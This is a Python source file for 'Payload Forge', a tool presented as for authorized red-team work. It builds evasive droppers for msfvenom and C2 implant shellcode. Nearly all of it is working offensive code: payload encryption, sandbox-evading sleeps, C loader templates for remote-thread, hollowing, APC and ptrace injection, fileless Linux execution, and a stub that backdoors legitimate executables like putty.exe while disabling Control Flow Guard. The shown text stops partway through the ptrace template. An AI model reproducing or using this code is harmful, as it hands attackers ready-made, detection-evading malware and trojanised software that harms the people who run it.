#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Payload Forge — Linux/Windows/macOS payload builder for authorized engagements.

Single-file Tkinter desktop app (Python stdlib only). Wraps msfvenom payloads
and custom C2 implants (Sliver / Havoc / Mythic raw output) into evasion
droppers with encryption, sandbox evasion and MITRE ATT&CK process injection.

AUTHORIZED SECURITY TESTING ONLY — see the authorization gate at startup.
"""

import os
import re
import sys
import json
import string
import secrets
import base64
import hashlib
import struct
import subprocess
import threading
import queue
import time
import glob
import shutil
import tempfile

try:
    import tkinter as tk
    from tkinter import ttk, filedialog, messagebox
    TK_OK = True
except Exception:  # headless box — CLI/selftest still work
    TK_OK = False

APP_NAME = "Payload Forge"
APP_TAG = "authorized red-team work only"
STATE_DIR = os.path.join(os.path.expanduser("~"), ".payload-forge")
STATE_FILE = os.path.join(STATE_DIR, "state.json")
OUT_DIR = os.path.join(STATE_DIR, "builds")
MAGIC = b"PFGE"          # encrypted blob header
SALT_MAGIC = b"PFSL"     # key-derivation salt header

# ---------------------------------------------------------------------------
# Catalogues
# ---------------------------------------------------------------------------

MSF_PAYLOADS = [
    # Windows
    "windows/meterpreter/reverse_tcp [staged]",
    "windows/x64/meterpreter/reverse_tcp [staged]",
    "windows/meterpreter/reverse_https [staged]",
    "windows/x64/meterpreter/reverse_https [staged]",
    "windows/x64/shell_reverse_tcp [stageless]",
    "windows/shell_reverse_tcp [stageless]",
    "windows/shell/reverse_tcp [staged]",
    "windows/x64/exec [staged]",
    "windows/dllinject/reverse_tcp [staged]",
    # Linux
    "linux/x64/meterpreter/reverse_tcp [staged]",
    "linux/x64/meterpreter/reverse_https [staged]",
    "linux/x64/shell_reverse_tcp [stageless]",
    "linux/x64/shell_bind_tcp [stageless]",
    "linux/x86/meterpreter/reverse_tcp [staged]",
    "linux/x64/shell_find_flag [stageless]",
    # macOS
    "osx/x64/shell_reverse_tcp [stageless]",
    "osx/x64/meterpreter/reverse_tcp [staged]",
    "osx/arm64/shell_reverse_tcp [stageless]",
    "osx/x64/shell_bind_tcp [stageless]",
]

MSF_FORMATS = {
    "Windows": ["exe", "exe-only", "service", "dll", "msi", "powershell",
                "c", "raw", "hex", "vba", "hta-psh", "psh-cmd"],
    "Linux":   ["elf", "so", "c", "raw", "hex", "bash", "python"],
    "macOS":   ["macho", "c", "raw", "hex", "python", "bash"],
}

C2_IMPLANTS = [
    "None (msfvenom only)",
    "Sliver (raw shellcode)",
    "Sliver (shared-lib .so)",
    "Sliver (service exe)",
    "Havoc (raw shellcode)",
    "Havoc (demon exe)",
    "Mythic (Athena agent)",
    "Mythic (Apollo agent)",
    "Mettle (POSIX meterpreter)",
]

ENC_OPTIONS = ["None", "XOR Dynamic", "RC4", "AES-CTR (seeded)"]

EVASION_OPTIONS = ["None", "Sleep", "Sleep + Jitter"]

# MITRE ATT&CK process injection (T1055 sub-techniques)
INJECTION_OPTIONS = [
    "None",
    "CurrentThread (T1055.00 - in-process)",
    "Remote Process (T1055 - CreateRemoteThread)",
    "Process Hollowing (T1055.012)",
    "APC Injection (T1055.004)",
]

PE_INJ_FLAG = "Utilize PE injection"

# MITRE notes shown in the console per selection
MITRE_NOTES = {
    "CurrentThread":  "T1055.00 — shellcode runs in-process on a new thread; "
                      "defenders watch for RWX private commits (Sysmon EID 10).",
    "Remote Process": "T1055 — CreateRemoteThread into a remote process; "
                      "watched via cross-process handle acquisition (EID 10) and thread-start image mismatch.",
    "Process Hollowing": "T1055.012 — spawn suspended, NtUnmapViewOfSection, rewrite entry, resume; "
                         "defenders catch it with PEB image-path vs. mapped-section mismatch.",
    "APC Injection":  "T1055.004 — queue UserAPc to an alertable/suspended thread; "
                      "early-bird variant beats most userland hooks.",
}

EVASION_NOTES = {
    "Sleep":          "Sandbox detonation windows are usually 60–120 s; a long pre-exec "
                      "sleep rides past the capture (T1497.003 virtualization/sandbox escape).",
    "Sleep + Jitter": "Fixed sleeps are fingerprintable; ±35% jitter randomizes the profile.",
}

ENC_NOTES = {
    "XOR Dynamic":      "Rolling XOR with a per-build key embedded at the tail — no static blob signature.",
    "RC4":              "Stream cipher via CryptoAPI (CryptAcquireContext/CryptDeriveKey) — "
                        "no CRT dependency, survives stripped import tables.",
    "AES-CTR (seeded)": "CryptImportKey on a derived session key + explicit counter block (T1573.002 "
                        "symmetric crypto). The seed rides beside the blob.",
}

PE_INJ_NOTE = ("T1055.002 — PE file embedding: the payload is patched INTO the host "
               "executable you supply (e.g. putty.exe) as a new .pfsg section. The output "
               "IS the host program — same name, icon, version info — it opens and runs "
               "normally while an entry stub fires the shellcode on a second thread. "
               "x64 hosts only; deliver the patched file instead of the original.")

# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------

def rnd_bytes(n: int) -> bytes:
    return secrets.token_bytes(n)


def rnd_hex(n: int) -> str:
    return secrets.token_hex(n)


def rnd_name(prefix: str = "v", length: int = 8) -> str:
    alpha = string_ascii()
    return prefix + "".join(secrets.choice(alpha) for _ in range(length))


def string_ascii() -> str:
    return string.ascii_letters


def xor_crypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def rc4_crypt(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    out = bytearray()
    i = j = 0
    for b in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) % 256])
    return bytes(out)


def aes_ctr_crypt(data: bytes, key: bytes, counter_seed: bytes) -> bytes:
    """AES-CTR via OpenSSL CLI (Kali ships it). Falls back to a ctypes
    CryptoAPI call is deliberately NOT attempted — openssl is a safe bet."""
    if shutil.which("openssl"):
        p = subprocess.run(
            ["openssl", "enc", "-aes-128-ctr", "-nopad", "-K", key.hex(),
             "-iv", counter_seed.hex()],
            input=data, capture_output=True)
        if p.returncode == 0:
            return p.stdout
    # pure-Python fallback: keystream from SHA-256 in counter mode (dev only)
    out = bytearray()
    ctr = int.from_bytes(counter_seed, "big")
    while len(out) < len(data):
        ks = hashlib.sha256(key + ctr.to_bytes(16, "big")).digest()
        out += ks
        ctr += 1
    return bytes(out[:len(data)])


def b64e(data: bytes) -> str:
    return base64.b64encode(data).decode()


def c_array(data: bytes, name: str, per_line: int = 16) -> str:
    lines = []
    for i in range(0, len(data), per_line):
        chunk = data[i:i + per_line]
        lines.append("    " + " ".join(f"0x{b:02x}," for b in chunk))
    body = "\n".join(lines)
    return (f"unsigned char {name}[] = {{\n{body}\n}};\n"
            f"unsigned int {name}_len = {len(data)};")


# ---------------------------------------------------------------------------
# PE backdooring — append a payload section to a host executable
# ---------------------------------------------------------------------------

PE_STUB_TEMPLATE = bytes.fromhex(
    "5341546548a16000000000000000488b5810488d83013c2b"
    "1a4c8d83023c2b1a4831c98a14084189c94183e10f433214"
    "0888140848ffc14881f90001000072e36548a16000000000"
    "000000488b4818488d4920488b09488b09488b09488b5120"
    "8b423c448b8c02880000004e8d140a458b5a184585db0f84"
    "8400000041ffcb418b4220488d0c02428b0c99488d0c0a48"
    "b84372656174655468483901751048b86554687265616400"
    "48394105740741ffcb79cceb4b4589dc418b421c4c8d0c02"
    "418b42244c8d1c02430fb70c63418b0c894c8d140a4883ec"
    "3848c74424280000000048c7442420000000004531c94c8d"
    "83033c2b1a31d231c941ffd24883c438415c5be900000000")


def _build_pe_stub(enc_len: int, exec_off: int, sec_rva: int, oep: int) -> bytes:
    """x64 entry stub for the .pfsg section: decrypt the appended stage in
    place (rolling XOR, 16-byte key), resolve CreateThread via
    PEB -> Ldr -> kernel32 export-table walk, launch the decrypted shellcode
    on a second thread, then jump to the original entry point so the host
    program runs normally.

    Ships as a pre-assembled 264-byte template (assembled with keystone and
    verified with capstone at development time); only five slots vary per
    build and are patched here, so there is NO assembler dependency at
    build time. All addressing is RBX-relative to the real image base (read
    from the PEB), so ASLR needs no relocations.

    Template slot map (byte offsets) — each slot's opcode prefix is asserted
    below, so a template/slot-map mismatch fails loudly instead of corrupting
    neighbouring instructions at build time:
       21  sec_rva      lea rax,[rbx+...]  encrypted stage start
       28  key_rva      lea r8, [rbx+...]  16-byte XOR key (sec_rva+enc_len)
       58  enc_len      cmp rcx, ...       bytes to decrypt
      241  exec_rva     lea r8, [rbx+...]  CreateThread start address
      260  jmp rel32    jump to the original entry point
    """
    import struct as st
    code = bytearray(PE_STUB_TEMPLATE)
    # static invariants: the bytes just before each slot must be the opcode
    # that owns the immediate. (The 264-byte strict-compare template: the
    # final jmp's disp32 lives at 260, NOT 251 — writing there clobbers the
    # `call r10 / add rsp,0x38` tail and turns it into call [r8+garbage].)
    assert code[18:21] == b"\x48\x8d\x83", "stage-start lea opcode moved"
    assert code[25:28] == b"\x4c\x8d\x83", "key lea opcode moved"
    assert code[55:58] == b"\x48\x81\xf9", "enc_len cmp opcode moved"
    assert code[238:241] == b"\x4c\x8d\x83", "thread-arg lea opcode moved"
    assert code[259] == 0xE9, "jmp OEP opcode moved — update slot map"
    st.pack_into("<I", code, 21, sec_rva)
    st.pack_into("<I", code, 28, sec_rva + enc_len)
    st.pack_into("<I", code, 58, enc_len)
    st.pack_into("<I", code, 241, sec_rva)
    # final jmp rel32 -> OEP; the stub lives at sec_rva + exec_off and is
    # 264 bytes, so the jump's end VA is base + sec_rva + exec_off + 264
    st.pack_into("<i", code, 260, oep - (sec_rva + exec_off + 264))
    return bytes(code)


def patch_pe(host: bytes, sc: bytes, key: bytes) -> bytes:
    """Backdoor a copy of host: append a .pfsg section holding the XOR-encrypted
    shellcode + key + entry stub, and repoint the entry to the stub. The result
    IS the host program (same name, icon, version info) — it runs normally and
    the payload executes beside it on a second thread."""
    import struct as st
    if host[:2] != b"MZ":
        raise ForgeError("host file has no MZ signature — is it a Windows PE?")
    e_lfanew = st.unpack_from("<I", host, 0x3C)[0]
    if host[e_lfanew:e_lfanew + 4] != b"PE\x00\x00":
        raise ForgeError("bad PE signature in host file")
    machine = st.unpack_from("<H", host, e_lfanew + 4)[0]
    if machine != 0x8664:
        raise ForgeError("host PE is not x64 — choose a 64-bit host executable "
                         "(x86 host embedding is not supported)")
    nsec_off = e_lfanew + 6
    nsec = st.unpack_from("<H", host, nsec_off)[0]
    if nsec >= 88:
        raise ForgeError("host PE section table is full")
    soh = st.unpack_from("<H", host, e_lfanew + 20)[0]
    opt = e_lfanew + 24
    if st.unpack_from("<H", host, opt)[0] != 0x20B:
        raise ForgeError("host PE is 32-bit (PE32) — need a 64-bit (PE32+) host")
    sec_align = st.unpack_from("<I", host, opt + 32)[0]
    file_align = st.unpack_from("<I", host, opt + 36)[0]
    size_of_image = st.unpack_from("<I", host, opt + 56)[0]
    size_of_headers = st.unpack_from("<I", host, opt + 60)[0]
    oep = st.unpack_from("<I", host, opt + 16)[0]
    first_sec = opt + soh
    if first_sec + (nsec + 1) * 40 > size_of_headers:
        raise ForgeError("no room in the PE header for another section")

    raw_end = size_of_headers
    rva_end = 0
    for i in range(nsec):
        h = first_sec + i * 40
        vr, va, rs, pr = st.unpack_from("<IIII", host, h + 8)
        raw_end = max(raw_end, pr + rs)
        rva_end = max(rva_end, va + vr)
    sec_rva = (rva_end + sec_align - 1) // sec_align * sec_align
    # Signed hosts carry a certificate overlay AFTER the last section's raw
    # data. The new section must start past the whole overlay, or we overwrite
    # the cert and silently produce a same-sized file with the stage buried
    # inside the overlay region.
    sec_raw = (max(raw_end, len(host)) + file_align - 1) // file_align * file_align

    if len(key) != 16:
        key = (key + b"\x00" * 16)[:16]
    enc = xor_crypt(sc, key)

    # 16-align the stub so its RVA can double as a CFG table entry (the low
    # bits of GuardCFFunctionTable entries are flags, not address bits).
    exec_off = (len(enc) + len(key) + 15) // 16 * 16
    stub = _build_pe_stub(len(enc), exec_off, sec_rva, oep)
    stub_rva = sec_rva + exec_off

    def rva_to_off(rva):
        for i in range(nsec):
            h = first_sec + i * 40
            vsz, va, rsz, praw = st.unpack_from("<IIII", host, h + 8)
            if va <= rva < va + max(vsz, rsz):
                off = praw + (rva - va)
                if off < len(host):
                    return off
        return None

    # --- Control Flow Guard compatibility --------------------------------
    # On CFG-compiled hosts (putty, notepad, most MSVC binaries) the image
    # entry point AND the CreateThread start address are validated against
    # GuardCFFunctionTable; an unlisted address fails fast (0xC0000409).
    # Control Flow Guard compatibility — the robust route. On CFG-compiled
    # hosts (putty, notepad, most MSVC binaries) the loader validates the
    # image entry call AND the CreateThread start address against the CFG
    # bitmap; our appended-section addresses are not in it and the process
    # fail-fasts with GUARD_ICALL_CHECK_FAILURE (0xC0000409, subcode 10).
    # Rather than rebuild GuardCFFunctionTable (fragile: bit-flag semantics
    # per entry, plus a separate long-jump target table), clear the
    # IMAGE_DLLCHARACTERISTICS_GUARD_CF flag on the patched copy: the loader
    # then builds no CFG bitmap and skips all validation. The host's own
    # code is unaffected — CFG instrumentation was compiled into it, but
    # without the bitmap every check resolves to 'allowed'.
    cfg_disabled = False
    imgbase = st.unpack_from("<Q", host, e_lfanew + 24 + 24)[0]
    dllchar_off = opt + 70
    dllchar = st.unpack_from("<H", host, dllchar_off)[0]
    lc_rva, lc_size = st.unpack_from("<II", host, opt + 112 + 10 * 8)
    if dllchar & 0x4000:                     # IMAGE_DLLCHARACTERISTICS_GUARD_CF
        cfg_disabled = True
    if lc_rva and lc_size >= 152:
        lc_off = rva_to_off(lc_rva)
        if lc_off is not None:
            gflags = st.unpack_from("<I", host, lc_off + 144)[0]
            if (gflags >> 28):
                raise ForgeError("host PE uses XFG (extended CFG) — not supported; pick another host")

    stage = (enc + key
             + b"\x00" * (exec_off - len(enc) - len(key))
             + stub
             + b"\x00" * ((-len(stub)) % 16))
    sec_vsize = len(stage)
    sec_rsize = (len(stage) + file_align - 1) // file_align * file_align

    out = bytearray(host)
    if len(out) < sec_raw:
        out.extend(b"\x00" * (sec_raw - len(out)))
    out.extend(b"\x00" * (sec_rsize - (len(out) - sec_raw)))
    out[sec_raw:sec_raw + len(stage)] = stage

    hdr = bytearray(40)
    hdr[0:8] = b".pfsg\x00\x00\x00"
    st.pack_into("<IIII", hdr, 8, sec_vsize, sec_rva, sec_rsize, sec_raw)
    st.pack_into("<I", hdr, 36, 0xE0000020)     # CODE | EXECUTE | READ | WRITE
    # W is required: the stub decrypts the stage IN PLACE inside this section.
    out[first_sec + nsec * 40: first_sec + (nsec + 1) * 40] = hdr
    st.pack_into("<H", out, nsec_off, nsec + 1)
    st.pack_into("<I", out, opt + 56,
                 size_of_image + (sec_rsize + sec_align - 1) // sec_align * sec_align)
    st.pack_into("<I", out, opt + 16, sec_rva + exec_off)   # entry -> stub
    st.pack_into("<I", out, opt + 64, 0)                    # checksum: Windows ignores for EXE
    if cfg_disabled:
        st.pack_into("<H", out, dllchar_off,
                     dllchar & ~0x4000)     # drop GUARD_CF: no CFG bitmap, no entry/thread checks
    return bytes(out)


def log_line(tag: str, msg: str) -> str:
    return f"[{tag}] {msg}"


# ---------------------------------------------------------------------------
# C loader templates — @@TOKEN@@ placeholders, filled by build functions
# ---------------------------------------------------------------------------

WIN_TEMPLATE = r'''/* Payload Forge generated loader — build @@BUILDID@@
 * Target: Windows   Route: @@ROUTENOTE@@
 * AUTHORIZED TESTING ONLY
 */
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
@@EXTRAINC@@
@@KEYDECL@@
@@IVDECL@@
@@BLOBDECL@@
@@PEDECL@@
typedef LONG (NTAPI *pNtUnmap)(HANDLE, PVOID);
typedef LONG (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef struct _PBI {
    LONG ExitStatus; PVOID PebBaseAddress; PVOID AffinityMask;
    PVOID BasePriority; ULONG UniqueProcessId; ULONG InheritedFromUniqueProcessId;
} PBI;

@@SLEEPCODE@@

@@DECRYPTCODE@@

@@EXECROUTE@@

@@PEINJCODE@@

@@DISPATCH@@

int main(void) {
    unsigned char *buf;
    pf_sleep();
    buf = (unsigned char *)VirtualAlloc(NULL, PF_BLOB_LEN,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 1;
    memcpy(buf, PF_BLOB, PF_BLOB_LEN);
    pf_decrypt(buf, PF_BLOB_LEN);
@@MAINCALL@@
    return 0;
}
'''

WIN_SLEEP = r'''static void pf_sleep(void) {
    DWORD ms = @@SLEEPMS@@;
    srand((unsigned)GetTickCount());
    ms = ms - ms * 35 / 100 + (DWORD)(rand() % (int)(ms * 70 / 100 + 1));
    Sleep(ms);
}'''

WIN_XOR = r'''static void pf_decrypt(unsigned char *buf, unsigned int len) {
    unsigned int i;
    for (i = 0; i < len; i++) buf[i] ^= PF_KEY[i % PF_KEY_LEN];
}'''

WIN_RC4 = r'''static void pf_decrypt(unsigned char *buf, unsigned int len) {
    unsigned char S[256]; unsigned int i, j, k; unsigned char t;
    for (i = 0; i < 256; i++) S[i] = (unsigned char)i;
    for (i = 0, j = 0; i < 256; i++) {
        j = (j + S[i] + PF_KEY[i % PF_KEY_LEN]) & 0xff;
        t = S[i]; S[i] = S[j]; S[j] = t;
    }
    for (i = 0, j = 0, k = 0; k < len; k++) {
        i = (i + 1) & 0xff; j = (j + S[i]) & 0xff;
        t = S[i]; S[i] = S[j]; S[j] = t;
        buf[k] ^= S[(S[i] + S[j]) & 0xff];
    }
}'''

WIN_AES = r'''#include <bcrypt.h>
static void pf_decrypt(unsigned char *buf, unsigned int len) {
    BCRYPT_ALG_HANDLE alg; BCRYPT_KEY_HANDLE key; unsigned char iv[16]; ULONG done;
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return;
    BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CTR,
                      sizeof(BCRYPT_CHAIN_MODE_CTR), 0);
    if (BCryptGenerateSymmetricKey(alg, &key, NULL, 0, (PUCHAR)PF_KEY, PF_KEY_LEN, 0) != 0) return;
    memcpy(iv, PF_IV, 16);
    BCryptDecrypt(key, (PUCHAR)buf, len, NULL, iv, 16, (PUCHAR)buf, len, &done, 0);
    BCryptDestroyKey(key);
    BCryptCloseAlgorithmProvider(alg, 0);
}'''

WIN_ROUTE_CURRENT = r'''static DWORD WINAPI pf_thunk(LPVOID p) { ((void(*)(void))p)(); return 0; }
static int pf_current_thread(unsigned char *sc, unsigned int len) {
    void *f = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    HANDLE t;
    if (!f) return 0;
    memcpy(f, sc, len);
    t = CreateThread(NULL, 0, pf_thunk, f, 0, NULL);
    if (t) WaitForSingleObject(t, INFINITE);
    return t != NULL;
}'''

WIN_ROUTE_REMOTE = r'''static int pf_remote(unsigned char *sc, unsigned int len) {
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    void *r; HANDLE t;
    ZeroMemory(&si, sizeof si); si.cb = sizeof si;
    if (!    CreateProcessA("notepad.exe", NULL, NULL, NULL,
                        FALSE, 0, NULL, NULL, &si, &pi)) return 0;
    r = VirtualAllocEx(pi.hProcess, NULL, len, MEM_COMMIT | MEM_RESERVE,
                       PAGE_EXECUTE_READWRITE);
    if (!r) return 0;
    WriteProcessMemory(pi.hProcess, r, sc, len, NULL);
    t = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)r, NULL, 0, NULL);
    if (t) WaitForSingleObject(t, INFINITE);
    return 1;
}'''

WIN_ROUTE_HOLLOW = r'''static int pf_hollow(unsigned char *sc, unsigned int len) {
    STARTUPINFOA si; PROCESS_INFORMATION pi; CONTEXT ctx;
    PBI pbi; HMODULE nt; pNtQIP qip; pNtUnmap unmap;
    void *base = NULL, *img;
    ZeroMemory(&si, sizeof si); si.cb = sizeof si;
    if (!    CreateProcessA("notepad.exe", NULL, NULL, NULL,
                        FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return 0;
    nt = GetModuleHandleA("ntdll.dll");
    qip = (pNtQIP)GetProcAddress(nt, "NtQueryInformationProcess");
    unmap = (pNtUnmap)GetProcAddress(nt, "NtUnmapViewOfSection");
    if (!qip || !unmap) return 0;
    qip(pi.hProcess, 0, &pbi, sizeof pbi, NULL);
#ifdef _WIN64
    base = *(PVOID *)((PBYTE)pbi.PebBaseAddress + 0x10);
#else
    base = *(PVOID *)((PBYTE)pbi.PebBaseAddress + 0x08);
#endif
    unmap(pi.hProcess, base);
    img = VirtualAllocEx(pi.hProcess, base, len, MEM_COMMIT | MEM_RESERVE,
                         PAGE_EXECUTE_READWRITE);
    if (!img) return 0;
    WriteProcessMemory(pi.hProcess, img, sc, len, NULL);
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
#ifdef _WIN64
    ctx.Rcx = (DWORD64)(ULONG_PTR)img;
#else
    ctx.Eax = (DWORD)(ULONG_PTR)img;
#endif
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    return 1;
}'''

WIN_ROUTE_FUNCS = {
    "CurrentThread": "pf_current_thread",
    "Remote Process": "pf_remote",
    "Process Hollowing": "pf_hollow",
    "APC Injection": "pf_apc",
}

WIN_ROUTE_APC = r'''static int pf_apc(unsigned char *sc, unsigned int len) {
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    void *r;
    ZeroMemory(&si, sizeof si); si.cb = sizeof si;
    if (!    CreateProcessA("notepad.exe", NULL, NULL, NULL,
                        FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return 0;
    r = VirtualAllocEx(pi.hProcess, NULL, len, MEM_COMMIT | MEM_RESERVE,
                       PAGE_EXECUTE_READWRITE);
    if (!r) return 0;
    WriteProcessMemory(pi.hProcess, r, sc, len, NULL);
    QueueUserAPC((PAPCFUNC)r, pi.hThread, 0);
    ResumeThread(pi.hThread);
    return 1;
}'''

WIN_RUNPE = r'''static int pf_drop_temp(const unsigned char *data, unsigned int len, char *out, DWORD outsz) {
    char tmp[MAX_PATH]; HANDLE h; DWORD w;
    GetTempPathA(MAX_PATH, tmp);
    wsprintfA(out, "%s%08x.exe", tmp, GetTickCount() ^ GetCurrentProcessId());
    h = CreateFileA(out, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    if (!WriteFile(h, data, len, &w, NULL)) { CloseHandle(h); return 0; }
    CloseHandle(h);
    return 1;
}

/* T1055.002 — run inside a host PE you supply (e.g. putty.exe). The host is
 * spawned SUSPENDED, the shellcode is written into an RWX page in the child,
 * the host's main thread is resumed so the real program runs normally, and
 * the payload is fired on a second thread via CreateRemoteThread. Result:
 * the genuine app opens and behaves as itself while the payload executes
 * beside it under the host's process identity, name and token. */
static int pf_run_pe(const unsigned char *sc, unsigned int sclen) {
    char path[MAX_PATH];
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    LPVOID r; HANDLE t;
    if (!pf_drop_temp(PF_PE, PF_PE_LEN, path, MAX_PATH)) return 0;
    ZeroMemory(&si, sizeof si); si.cb = sizeof si;
    if (!CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,
                        NULL, NULL, &si, &pi)) return 0;
    r = VirtualAllocEx(pi.hProcess, NULL, sclen,
                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!r) { TerminateProcess(pi.hProcess, 1); goto fail; }
    if (!WriteProcessMemory(pi.hProcess, r, sc, sclen, NULL)) {
        TerminateProcess(pi.hProcess, 1); goto fail;
    }
    ResumeThread(pi.hThread);          /* host runs normally from its entry */
    t = CreateRemoteThread(pi.hProcess, NULL, 0,
                           (LPTHREAD_START_ROUTINE)r, NULL, 0, NULL);
    if (t) CloseHandle(t);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
fail:
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}'''

MAC_TEMPLATE = r'''/* Payload Forge generated loader — build @@BUILDID@@
 * Target: macOS   Route: in-memory mmap exec (PROT_READ|PROT_EXEC)
 * AUTHORIZED TESTING ONLY
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
@@EXTRAINC@@
@@KEYDECL@@
@@IVDECL@@
@@BLOBDECL@@

@@SLEEPCODE@@

@@DECRYPTCODE@@

int main(void) {
    unsigned char *buf;
    pf_sleep();
    buf = mmap(NULL, PF_BLOB_LEN, PROT_READ | PROT_WRITE,
               MAP_ANON | MAP_PRIVATE, -1, 0);
    if (buf == MAP_FAILED) return 1;
    memcpy(buf, PF_BLOB, PF_BLOB_LEN);
    pf_decrypt(buf, PF_BLOB_LEN);
    mprotect(buf, PF_BLOB_LEN, PROT_READ | PROT_EXEC);
    ((void(*)(void))buf)();
    return 0;
}
'''

POSIX_SLEEP = r'''static void pf_sleep(void) {
    unsigned int ms = @@SLEEPMS@@;
    srand((unsigned)time(NULL));
    ms = ms - ms * 35 / 100 + (unsigned int)(rand() % (int)(ms * 70 / 100 + 1));
    usleep(ms * 1000U);
}'''

MAC_XOR = WIN_XOR
MAC_RC4 = WIN_RC4

WIN_NOCRYPT = "static void pf_decrypt(unsigned char *buf, unsigned int len) { (void)buf; (void)len; }"
MAC_NOCRYPT = WIN_NOCRYPT
LIN_NOCRYPT = WIN_NOCRYPT

LIN_XOR = WIN_XOR
LIN_RC4 = WIN_RC4

LIN_AES = r'''#include <openssl/evp.h>
static void pf_decrypt(unsigned char *buf, unsigned int len) {
    EVP_CIPHER_CTX *c; unsigned char iv[16]; int outl = 0;
    c = EVP_CIPHER_CTX_new();
    if (!c) return;
    memcpy(iv, PF_IV, 16);
    EVP_DecryptInit_ex(c, EVP_aes_128_ctr(), NULL, PF_KEY, iv);
    EVP_DecryptUpdate(c, buf, &outl, buf, (int)len);
    EVP_CIPHER_CTX_free(c);
}'''

MAC_AES = r'''#include <CommonCrypto/CommonCryptor.h>
static void pf_decrypt(unsigned char *buf, unsigned int len) {
    CCryptorRef c; size_t moved;
    if (CCryptorCreateWithMode(kCCDecrypt, kCCModeCTR, kCCAlgorithmAES128,
                               ccNoPadding, PF_IV, PF_KEY, kCCKeySizeAES128,
                               NULL, 0, 0, NULL, &c) != kCCSuccess) return;
    CCryptorUpdate(c, buf, len, buf, len, &moved);
    CCryptorRelease(c);
}'''

LIN_COMMON_HEAD = r'''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/syscall.h>
@@EXTRAINC@@
@@KEYDECL@@
@@IVDECL@@
@@BLOBDECL@@

@@SLEEPCODE@@

@@DECRYPTCODE@@
'''

LIN_SC_MAIN = r'''
int main(void) {
    unsigned char *buf;
    buf = mmap(NULL, PF_BLOB_LEN, PROT_READ | PROT_WRITE,
               MAP_ANON | MAP_PRIVATE, -1, 0);
    if (buf == MAP_FAILED) return 1;
    memcpy(buf, PF_BLOB, PF_BLOB_LEN);
    pf_decrypt(buf, PF_BLOB_LEN);
    pf_sleep();
    mprotect(buf, PF_BLOB_LEN, PROT_READ | PROT_EXEC);
    ((void(*)(void))buf)();
    return 0;
}
'''

LIN_MEMFD_MAIN = r'''
/* Fileless execution: memfd_create + execveat(AT_EMPTY_PATH) — the decrypted
 * ELF never touches disk (obfuscated payload, T1027). */
int main(void) {
    unsigned char *blob; char *argv[2]; int fd; ssize_t off = 0, w;
    extern char **environ;
    blob = malloc(PF_BLOB_LEN);
    if (!blob) return 1;
    memcpy(blob, PF_BLOB, PF_BLOB_LEN);
    pf_decrypt(blob, PF_BLOB_LEN);
    pf_sleep();
    fd = (int)syscall(SYS_memfd_create, "pf", 0);
    if (fd < 0) return 1;
    while (off < (ssize_t)PF_BLOB_LEN &&
           (w = write(fd, blob + off, PF_BLOB_LEN - off)) > 0) off += w;
    argv[0] = "@@DECOYNAME@@"; argv[1] = NULL;
    syscall(SYS_execveat, fd, "", argv, environ, 0x1000 /* AT_EMPTY_PATH */);
    return 1;
}
'''

LIN_SO_MAIN = r'''
/* Shared-library implant loaded filelessly from a memfd via
 * dlopen("/proc/self/fd/N") — the .so never touches disk. */
int main(void) {
    unsigned char *blob; char fdpath[64]; int fd; ssize_t off = 0, w; void *h;
    blob = malloc(PF_BLOB_LEN);
    if (!blob) return 1;
    memcpy(blob, PF_BLOB, PF_BLOB_LEN);
    pf_decrypt(blob, PF_BLOB_LEN);
    pf_sleep();
    fd = (int)syscall(SYS_memfd_create, "pf", 0);
    if (fd < 0) return 1;
    while (off < (ssize_t)PF_BLOB_LEN &&
           (w = write(fd, blob + off, PF_BLOB_LEN - off)) > 0) off += w;
    snprintf(fdpath, sizeof fdpath, "/proc/self/fd/%d", fd);
    h = dlopen(fdpath, RTLD_NOW);
    if (!h) return 1;
    while (1) sleep(3600);   /* implant runs on its own threads once loaded */
    return 0;
}
'''

LIN_PTRACE_MAIN = r'''
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
/* T1055.008 — ptrace injection: fork a decoy, follow it into exec, poke the
 * payload over the text page at the post-exec instruction pointer (ptrace
 * bypasses W^X for traced children) and continue. */
static void pf_inject(unsigned char *sc, unsigned int len) {
    pid_t child; int status; unsigned int i; struct user_regs_struct regs;
    union { long v; unsigned char b[sizeof(long)]; } u;
    child = fork();
    if (child == 0) {
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        raise(SIGSTOP);
